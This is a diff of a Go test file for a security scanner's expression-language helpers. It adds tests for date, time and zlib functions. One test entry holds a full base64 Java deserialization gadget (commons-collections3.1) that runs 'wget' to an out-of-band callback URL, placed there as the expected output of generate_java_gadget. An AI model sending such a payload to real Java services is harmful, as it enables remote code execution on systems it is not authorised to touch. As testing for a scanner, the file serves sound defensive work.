@@ -51,6 +51,16 @@ func TestDSLGzipSerialize(t *testing.T) {
 	require.Equal(t, "hello world", data.(string), "could not get gzip encoded data")
 }
 
+func TestTimeToStringDSLFunction(t *testing.T) {
+	compiled, err := govaluate.NewEvaluableExpressionWithFunctions("timetostring(data)", HelperFunctions())
+	require.Nil(t, err, "could not compile encoder")
+
+	data := time.Now()
+	result, err := compiled.Evaluate(map[string]interface{}{"data": data})
+	require.Nil(t, err, "could not evaluate compare time")
+
+	require.Equal(t, data.String(), result.(string), "could not get correct time format string")
+}
 func TestDslFunctionSignatures(t *testing.T) {
 	type testCase struct {
 		methodName string
@@ -100,6 +110,7 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 	[93mbase64_py[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93mconcat[0m(args [38;5;208m...interface{}[0m)[38;5;208m string[0m
 	[93mcontains[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
+	[93mdate[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93mgenerate_java_gadget[0m(arg1, arg2, arg3 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93mgzip[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93mgzip_decode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
@@ -125,6 +136,8 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 	[93mreverse[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93msha1[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93msha256[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
+	[93mtime[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
+	[93mtimetostring[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93mto_lower[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93mto_number[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93mto_string[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
@@ -139,6 +152,8 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 	[93murl_decode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93murl_encode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 	[93mwait_for[0m(seconds [38;5;208muint[0m)[38;5;208m[0m
+	[93mzlib[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
+	[93mzlib_decode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
 `
 	t.Run("with coloring", func(t *testing.T) {
 		assert.Equal(t, expected, GetPrintableDslFunctionSignatures(false))
@@ -153,6 +168,8 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 }
 
 func TestDslExpressions(t *testing.T) {
+	now := time.Now()
+
 	dslExpressions := map[string]interface{}{
 		`base64("Hello")`:                                "SGVsbG8=",
 		`base64(1234)`:                                   "MTIzNA==",
@@ -160,6 +177,8 @@ func TestDslExpressions(t *testing.T) {
 		`hex_encode("aa")`:                               "6161",
 		`html_escape("<body>test</body>")`:               "&lt;body&gt;test&lt;/body&gt;",
 		`html_unescape("&lt;body&gt;test&lt;/body&gt;")`: "<body>test</body>",
+		`date("%Y-%M-%D")`:                               fmt.Sprintf("%d-%d-%d", now.Year(), now.Month(), now.Day()),
+		`time("%H-%M")`:                                  fmt.Sprintf("%d-%d", now.Hour(), now.Minute()),
 		`md5("Hello")`:                                   "8b1a9953c4611296a827abf8c47804d7",
 		`md5(1234)`:                                      "81dc9bdb52d04dc20036dbd8313ed055",
 		`mmh3("Hello")`:                                  "316307400",
@@ -185,6 +204,8 @@ func TestDslExpressions(t *testing.T) {
 		`url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")`: "https://projectdiscovery.io?test=1",
 		`url_encode("https://projectdiscovery.io/test?a=1")`:     "https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1",
 		`gzip("Hello")`: "\x1f\x8b\b\x00\x00\x00\x00\x00\x00\xff\xf2H\xcd\xc9\xc9\a\x04\x00\x00\xff\xff\x82\x89\xd1\xf7\x05\x00\x00\x00",
+		`zlib("Hello")`: "\x78\x9c\xf2\x48\xcd\xc9\xc9\x07\x04\x00\x00\xff\xff\x05\x8c\x01\xf5",
+		`zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))`:                               "Hello",
 		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`:       "Hello",
 		`generate_java_gadget("commons-collections3.1", "wget https://{{interactsh-url}}", "base64")`: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAJmh0dHBzOi8vZ2l0aHViLmNvbS9qb2FvbWF0b3NmL2pleGJvc3Mgc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl%2BwoepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2BABtzcQB%2BABN1cQB%2BABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAH3dnZXQgaHR0cHM6Ly97e2ludGVyYWN0c2gtdXJsfX10AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==",
 		`base64_decode("SGVsbG8=")`:    "Hello",
